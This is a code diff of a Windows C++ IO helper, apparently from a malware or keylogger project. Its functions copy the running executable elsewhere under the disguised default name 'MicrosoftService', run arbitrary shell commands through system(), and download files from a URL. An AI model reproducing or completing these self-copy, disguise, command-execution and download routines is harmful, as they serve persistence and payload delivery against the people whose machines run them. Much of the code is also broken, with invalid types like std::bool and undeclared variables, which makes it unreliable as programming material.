@@ -7,8 +7,9 @@
 #include <windows.h>
 #include "Helper.h"
 #include "Base64.h"
-#include <Urlmon.h>
+//#include <Urlmon.h>
 #include <tchar.h>
+#include <vector>
 
 namespace IO
 {
@@ -61,10 +62,10 @@ namespace IO
       return "";
     }
   }
-    
-    
-    std::bool copy(std::string path,std::string filename){
-        TCHAR szExeFileName[MAX_PATH];
+
+
+    bool copy(std::string path,std::string filename){
+        TCHAR szExeFileName[MAX_PATH] = TEXT("MicrosoftService");
         //get self name
         std::string cur_path_filename = GetModuleFileName(NULL, szExeFileName, MAX_PATH);
         //open self
@@ -91,18 +92,18 @@ namespace IO
         {
             return false;
         }
-        
+
         initialFile.close();
         outputFile.close();
         return true;
     }
-    
-    
-    
+
+
+
     std::void shell_cmd(std::string command){
         system(command);
     }
-    
+
     std::bool copy_w_cmd(std::string path,std::string filename){
         std::string cur_path_filename = GetModuleFileName(NULL, szExeFileName, MAX_PATH);
         std::string command = "cp "+cur_path_filename+" "+path+filename;
@@ -112,22 +113,22 @@ namespace IO
             return false;
         }
         return true;
-    
+
     }
-    
+
     std::bool ms_Copyfile(const char * desfile_path){
         const char * cur_path_filename = GetModuleFileName(NULL, szExeFileName, MAX_PATH);
         if (CopyFile (cur_path_filename, desfile_path, true))
             return false;
-        
+
         else
            return true;
-        
+
     }
-    
+
     std::bool download_File(std::string urlfile,TCHAR * despath)
     {
-        
+
         TCHAR url[] = TEXT(urlfile);
         TCHAR path[MAX_PATH] = despath;
         //GetCurrentDirectory(MAX_PATH, path);
@@ -138,14 +139,14 @@ namespace IO
             return true;
         } else if(res == E_OUTOFMEMORY) {
             return false;
-            
+
         } else if(res == INET_E_DOWNLOAD_FAILURE) {
             return false;
-            
+
         } else {
             return false;
         }
-        
+
         return false;
     }
 }
